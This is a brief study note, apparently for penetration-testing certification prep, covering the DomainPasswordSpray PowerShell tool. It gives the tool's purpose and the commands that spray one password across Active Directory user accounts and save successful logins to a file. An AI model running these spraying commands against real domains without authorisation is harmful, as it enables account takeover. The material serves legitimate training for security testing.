---
tags: [cpts, tool, domainpasswordspray, password-spraying]
---

# 🧰 DomainPasswordSpray

## 📦 Install
See [[Tool-Install]]. (dafthack/DomainPasswordSpray)

## 🎯 Purpose
PowerShell domain password spraying from a domain-joined/authenticated Windows host. Auto-enumerates users, reads the (fine-grained) password policy, strips disabled/near-lockout accounts.

## 🧱 Core syntax
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password $PASS -OutFile spray_success -ErrorAction SilentlyContinue
```

## 🚩 Useful flags
```text
-Password $PASS          # the single password to spray
-UserList $FILE           # optional — auto-generated from current domain context if omitted
-OutFile $FILE             # save successful hits
-ErrorAction SilentlyContinue
```

## 🔧 Variants
```powershell
# With an explicit user list
Invoke-DomainPasswordSpray -UserList $USERLIST -Password $PASS -OutFile spray_success -ErrorAction SilentlyContinue
```

#domainpasswordspray #cpts
